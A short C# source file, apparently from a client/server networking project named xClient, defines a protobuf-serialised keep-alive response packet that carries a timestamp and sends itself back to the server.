using System;
using ProtoBuf;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    internal class KeepAliveResponse : IPacket
    {
        [ProtoMember(1)]
        public DateTime TimeSent { get; set; }

        public void Execute(Client client)
        {
            client.Send<KeepAliveResponse>(this);
        }
    }
}